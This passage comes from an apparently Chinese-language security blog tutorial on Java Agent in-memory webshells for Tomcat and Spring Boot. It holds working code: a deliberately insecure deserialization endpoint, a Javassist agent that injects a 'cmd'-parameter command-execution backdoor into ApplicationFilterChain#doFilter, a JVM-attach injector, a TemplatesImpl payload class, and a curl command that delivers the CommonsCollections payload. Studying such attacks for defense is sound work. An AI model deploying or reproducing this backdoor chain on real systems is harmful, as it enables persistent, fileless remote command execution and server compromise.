[Debug] Loading class: org/apache/jasper/servlet/JspServlet
Retransform subclass Success: class org.apache.jasper.servlet.JspServlet
Found HttpServlet subclass: class org.apache.catalina.servlets.DefaultServlet
[Debug] Loading class: org/apache/catalina/servlets/DefaultServlet
Retransform subclass Success: class org.apache.catalina.servlets.DefaultServlet

//成功对 javax.servlet.http.HttpServlet（基类） 做了 transform（插入/修改字节码），并把修改生效了（retransform success）
Found HttpServlet (base): class javax.servlet.http.HttpServlet
[Debug] Loading class: javax/servlet/http/HttpServlet
[+] Found target class: javax.servlet.http.HttpServlet
[+] Start transforming HttpServlet...
[+] HttpServlet Transformed Complete.
Retransform HttpServlet Success.

//transform() 调用中抛出了 NullPointerException
[!] Transform failed: java.lang.NullPointerException
java.lang.NullPointerException
	at com.src.agent.ServletTransformer.transform(ServletTransformer.java:28)
	at sun.instrument.TransformerManager.transform(TransformerManager.java:188)
	at sun.instrument.InstrumentationImpl.transform(InstrumentationImpl.java:428)
	at sun.misc.Unsafe.defineAnonymousClass(Native Method)
	at java.lang.invoke.InnerClassLambdaMetafactory.spinInnerClass(InnerClassLambdaMetafactory.java:326)
	at java.lang.invoke.InnerClassLambdaMetafactory.buildCallSite(InnerClassLambdaMetafactory.java:194)
	at java.lang.invoke.LambdaMetafactory.metafactory(LambdaMetafactory.java:304)
	at java.lang.invoke.CallSite.makeSite(CallSite.java:302)
	at java.lang.invoke.MethodHandleNatives.linkCallSiteImpl(MethodHandleNatives.java:307)
	at java.lang.invoke.MethodHandleNatives.linkCallSite(MethodHandleNatives.java:297)
	at org.apache.tomcat.util.http.Parameters.addParameter(Parameters.java:212)
	at org.apache.tomcat.util.http.Parameters.processParameters(Parameters.java:390)
	at org.apache.tomcat.util.http.Parameters.processParameters(Parameters.java:481)
	at org.apache.tomcat.util.http.Parameters.handleQueryParameters(Parameters.java:194)
	at org.apache.catalina.connector.Request.parseParameters(Request.java:2938)
	at org.apache.catalina.connector.Request.getParameter(Request.java:1088)
	at org.apache.catalina.connector.RequestFacade.getParameter(RequestFacade.java:309)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:623)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:199)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:144)
	at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:51)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:168)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:144)
	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:168)
	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:90)
	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:482)
	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:130)
	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:93)
	at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:656)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:346)
	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:397)
	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:935)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1792)
	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
	at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1189)
	at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:658)
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:63)
	at java.lang.Thread.run(Thread.java:745)
```



可以执行命令：

（：但是当前的内存马只是部分生效，/hello-servlet 路径可以执行，其他不可以





![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523380.png)





![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523450.png)









### 4.3.2 方式二

#### 环境

SpringBoot 2.6.13  

CommonCollection 3.2.1



搭建一个反序列化环境：



```java
package com.src.demos.web;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.ObjectInputStream;

@Controller
public class AgentFilter {

    @ResponseBody
    @RequestMapping("/cc")
    public String cc11Vuln(HttpServletRequest request, HttpServletResponse response) throws Exception {
        java.io.InputStream inputStream =  request.getInputStream();
        ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);
        objectInputStream.readObject();
        return "Hello,World";
    }

    @ResponseBody
    @RequestMapping("/demo")
    public String demo(HttpServletRequest request, HttpServletResponse response) throws Exception{
        return "This is OK Demo!";
    }

}
```



![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081525866.png)





#### 寻找关键类



在Filter中存在doFilter方法，除了会对我们的请求进行过滤，会依次调用FilterChains中的Filter，同时在 `ApplicationFilterChain#doFilter` 中还封装了我们用户请求的 request 和 response ，那么如果我们能够注入该方法，那么我们不就可以直接获取用户的请求，将执行结果写在 response 中进行返回。



![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523934.png)





#### 反序列化注入

注入流程如下：

1. 编写 agent.jar 从而实现 `org.apache.catalina.core.ApplicationFilterChain#doFilter` 进行字节码修改
2. 利用 `CC依赖` 的反序列化漏洞将我们的加载代码打进去，然后使其执行来加载我们的 agent.jar



#### agent.jar

pom.xml 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
  <modelVersion>4.0.0</modelVersion>

  <groupId>com.src</groupId>
  <artifactId>Demo02</artifactId>
  <version>1.0-SNAPSHOT</version>

  <properties>
    <maven.compiler.source>8</maven.compiler.source>
    <maven.compiler.target>8</maven.compiler.target>
    <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
  </properties>

  <dependencies>
    <dependency>
      <groupId>org.javassist</groupId>
      <artifactId>javassist</artifactId>
      <version>3.29.2-GA</version>
    </dependency>
  </dependencies>

</project>
```



AgentMain.java

```java
import java.lang.instrument.Instrumentation;

public class AgentMain {
    public static final String ClassName = "org.apache.catalina.core.ApplicationFilterChain";

    public static void agentmain(String agentArgs, Instrumentation ins) {
        ins.addTransformer(new DefineTransformer(),true);
        // 获取所有已加载的类
        Class[] classes = ins.getAllLoadedClasses();
        for (Class clas:classes){
            if (clas.getName().equals(ClassName)){
                try{
                    // 对类进行重新定义
                    ins.retransformClasses(new Class[]{clas});
                } catch (Exception e){
                    e.printStackTrace();
                }
            }
        }
    }
}
```



DefineTransformer.java

```java
import javassist.*;
import java.lang.instrument.ClassFileTransformer;
import java.security.ProtectionDomain;


public class DefineTransformer implements ClassFileTransformer {

    public static final String ClassName = "org.apache.catalina.core.ApplicationFilterChain";

    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) {
        className = className.replace("/",".");
        if (className.equals(ClassName)){
            System.out.println("Find the Inject Class: " + ClassName);
            ClassPool pool = ClassPool.getDefault();
            try {
                CtClass c = pool.getCtClass(className);
                CtMethod m = c.getDeclaredMethod("doFilter");
                m.insertBefore("javax.servlet.http.HttpServletRequest req =  request;\n" +
                        "javax.servlet.http.HttpServletResponse res = response;\n" +
                        "java.lang.String cmd = request.getParameter(\"cmd\");\n" +
                        "if (cmd != null){\n" +
                        "    try {\n" +
                        "        java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();\n" +
                        "        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(in));\n" +
                        "        String line;\n" +
                        "        StringBuilder sb = new StringBuilder(\"\");\n" +
                        "        while ((line=reader.readLine()) != null){\n" +
                        "            sb.append(line).append(\"\\n\");\n" +
                        "        }\n" +
                        "        response.getOutputStream().print(sb.toString());\n" +
                        "        response.getOutputStream().flush();\n" +
                        "        response.getOutputStream().close();\n" +
                        "    } catch (Exception e){\n" +
                        "        e.printStackTrace();\n" +
                        "    }\n" +
                        "}");
                byte[] bytes = c.toBytecode();

                c.detach();

                return bytes;
            } catch (Exception e){
                e.printStackTrace();
            }
        }
        return new byte[0];
    }
}
```



maven 打包后 得到的 target/Demo02-1.0-SNAPSHOT.jar  就是我们需要的 agent.jar

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523970.png)





编写java代码来将其加载进JVM中

其中大致思路为获取到JVM的PID，调用 loadAgent 方法将 agent.jar 注入

#### InjectMain.java 

```java
package com.src;


public class InjectMain {
    public static void main(String[] args) {

        try{
            java.lang.String path = "D:\\JavaCode\\内存马\\AgentMem\\Demo02\\target\\Demo02-1.0-SNAPSHOT.jar";
            java.io.File toolsPath = new java.io.File(System.getProperty("java.home").replace("jre","lib") + java.io.File.separator + "tools.jar");
            java.net.URL url = toolsPath.toURI().toURL();
            java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]{url});
            Class/*<?>*/ MyVirtualMachine = classLoader.loadClass("com.sun.tools.attach.VirtualMachine");
            Class/*<?>*/ MyVirtualMachineDescriptor = classLoader.loadClass("com.sun.tools.attach.VirtualMachineDescriptor");
            java.lang.reflect.Method listMethod = MyVirtualMachine.getDeclaredMethod("list",null);
            java.util.List/*<Object>*/ list = (java.util.List/*<Object>*/) listMethod.invoke(MyVirtualMachine,null);

            System.out.println("Running JVM list ...");
            for(int i=0;i<list.size();i++){
                Object o = list.get(i);
                java.lang.reflect.Method displayName = MyVirtualMachineDescriptor.getDeclaredMethod("displayName",null);
                java.lang.String name = (java.lang.String) displayName.invoke(o,null);
                // 列出当前有哪些 JVM 进程在运行
                // 这里的 if 条件根据实际情况进行更改
                if (name.contains("com.src.Demo02EnvApplication")){
                    // 获取对应进程的 pid 号
                    java.lang.reflect.Method getId = MyVirtualMachineDescriptor.getDeclaredMethod("id",null);
                    java.lang.String id = (java.lang.String) getId.invoke(o,null);
                    System.out.println("id >>> " + id);
                    java.lang.reflect.Method attach = MyVirtualMachine.getDeclaredMethod("attach",new Class[]{java.lang.String.class});
                    java.lang.Object vm = attach.invoke(o,new Object[]{id});
                    java.lang.reflect.Method loadAgent = MyVirtualMachine.getDeclaredMethod("loadAgent",new Class[]{java.lang.String.class});
                    loadAgent.invoke(vm,new Object[]{path});
                    java.lang.reflect.Method detach = MyVirtualMachine.getDeclaredMethod("detach",null);
                    detach.invoke(vm,null);
                    System.out.println("Agent.jar Inject Success !!");
                    break;
                }
            }
        } catch (Exception e){
            e.printStackTrace();
        }
    }
}
```







![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523682.png)



#### CC 反序列化注入

通过CC反序列化进行注入Agent内存马， 编译生成 `Test.class`

```java
package com.src;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class Test extends AbstractTranslet {
    static {
        try{
            java.lang.String path = "D:\\JavaCode\\内存马\\AgentMem\\Demo02\\target\\Demo02-1.0-SNAPSHOT.jar";
            java.io.File toolsPath = new java.io.File(System.getProperty("java.home").replace("jre","lib") + java.io.File.separator + "tools.jar");
            java.net.URL url = toolsPath.toURI().toURL();
            java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]{url});
            Class/*<?>*/ MyVirtualMachine = classLoader.loadClass("com.sun.tools.attach.VirtualMachine");
            Class/*<?>*/ MyVirtualMachineDescriptor = classLoader.loadClass("com.sun.tools.attach.VirtualMachineDescriptor");
            java.lang.reflect.Method listMethod = MyVirtualMachine.getDeclaredMethod("list",null);
            java.util.List/*<Object>*/ list = (java.util.List/*<Object>*/) listMethod.invoke(MyVirtualMachine,null);

            System.out.println("Running JVM list ...");
            for(int i=0;i<list.size();i++){
                Object o = list.get(i);
                java.lang.reflect.Method displayName = MyVirtualMachineDescriptor.getDeclaredMethod("displayName",null);
                java.lang.String name = (java.lang.String) displayName.invoke(o,null);
                // 列出当前有哪些 JVM 进程在运行
                // 这里的 if 条件根据实际情况进行更改
                if (name.contains("com.src.Demo02EnvApplication")){
                    // 获取对应进程的 pid 号
                    java.lang.reflect.Method getId = MyVirtualMachineDescriptor.getDeclaredMethod("id",null);
                    java.lang.String id = (java.lang.String) getId.invoke(o,null);
                    System.out.println("id >>> " + id);
                    java.lang.reflect.Method attach = MyVirtualMachine.getDeclaredMethod("attach",new Class[]{java.lang.String.class});
                    java.lang.Object vm = attach.invoke(o,new Object[]{id});
                    java.lang.reflect.Method loadAgent = MyVirtualMachine.getDeclaredMethod("loadAgent",new Class[]{java.lang.String.class});
                    loadAgent.invoke(vm,new Object[]{path});
                    java.lang.reflect.Method detach = MyVirtualMachine.getDeclaredMethod("detach",null);
                    detach.invoke(vm,null);
                    System.out.println("Agent.jar Inject Success !!");
                    break;
                }
            }
        } catch (Exception e){
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    public Test(){

    }
}
```





 用 **java-chains** , 把 `Test.class` 注入到 `TemplatesImpl` 的 `_bytecodes`，生成了 `JavaNativePayload_…txt` 文件。  

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081525081.png)





![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081525372.png)





![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523154.png)



```
curl -v "http://localhost:8089/cc" --data-binary @test.ser
```



![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081525511.png)



1. 内存马注入情况

从日志来看：

Running JVM list ...

id >>> 40008

Find the Inject Class: org.apache.catalina.core.ApplicationFilterChain

Agent.jar Inject Success !!



使用的 Demo02-1.0-SNAPSHOT.jar 成功 attach 到了目标 JVM（PID 40008）。

org.apache.catalina.core.ApplicationFilterChain 作为 hook 入口已经被找到。

也就是说，内存马的 Agent 部分已经成功加载到 JVM。

所以注入是成功的，这部分没有问题



1. 

 curl 请求触发了 POST /cc，但是返回：

```java
java.lang.NullPointerException: null
	at com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet.postInitialization(AbstractTranslet.java:372) ~[na:1.8.0_65]
	at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance(TemplatesImpl.java:456) ~[na:1.8.0_65]
	at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer(TemplatesImpl.java:486) ~[na:1.8.0_65]
	at com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter.<init>(TrAXFilter.java:64) ~[na:1.8.0_65]
	at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method) ~[na:1.8.0_65]
	at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62) ~[na:1.8.0_65]
	at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45) ~[na:1.8.0_65]
	at java.lang.reflect.Constructor.newInstance(Constructor.java:422) ~[na:1.8.0_65]
```



分析原因：

你上传的 payload 是基于 CommonsCollections K3 + TemplatesImpl 的序列化。

错误发生在 TemplatesImpl 初始化阶段的 postInitialization 方法：

NullPointerException 一般是因为 TemplatesImpl 中 _bytecodes 或 _name 等字段为 null。

也就是说  test.ser 文件中，**TemplatesImpl 对象没有正确填充字节码**....

为什么生成的时候没有写进去呢？





# 参考：

[【原创】利用“进程注入”实现无文件不死webshell](https://www.cnblogs.com/rebeyond/p/9686213.html)


[Java安全学习——内存马 - 枫のBlog](https://goodapple.top/archives/1355)

[Spring内存马 | CurlySean’s Blog](http://101.36.122.13:4000/2025/08/06/Spring内存马/#J9TFY)



[Java Agent实现反序列化注入内存shell](https://y4er.com/posts/javaagent-tomcat-memshell/#简述内存shell)

[JavaWeb 内存马一周目通关攻略 | 素十八](https://su18.org/post/memory-shell/)

[JavaWeb 内存马二周目通关攻略 | 素十八](https://su18.org/post/memory-shell-2/)

[Shell中的幽灵王者—JAVAWEB 内存马 【认知篇】 - 嘶吼 RoarTalk – 网络安全行业综合服务平台,4hou.com](https://www.4hou.com/posts/zlkq)

[Java内存马——Tomcat Valve型的三种注入 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/433972.html)

[Java 内存马（四）：Spring Boot Controller 内存马 | 渐怀的博客](https://hilang.cloud/java-内存马（四）：spring-boot-controller-内存马/)

[Spring型内存马分析](https://stoocea.github.io/post/Spring型内存马分析.html#2-Controller-型内存马)

[Servlet 简介 | 菜鸟教程](https://www.runoob.com/servlet/servlet-intro.html)

[Spring内存马学习](https://clowsman.github.io/2024/11/13/Spring内存马学习/index.html)

[Spring内存马——Controller/Interceptor构造](https://xz.aliyun.com/news/11493)

[基础篇 - Javassist 使用指南](https://changeyourway.github.io/2024/06/07/Java 安全/基础篇-javassist用法指南/)

[Java安全学习——ROME反序列化 - 枫のBlog](https://goodapple.top/archives/1145#header-id-20) （使用Javassist缩短恶意class）

[Java Agent实现反序列化注入内存shell](https://y4er.com/posts/javaagent-tomcat-memshell/)

[Agent内存马 | CurlySean’s Blog](http://101.36.122.13:4000/2025/08/05/JavaAgent内存马)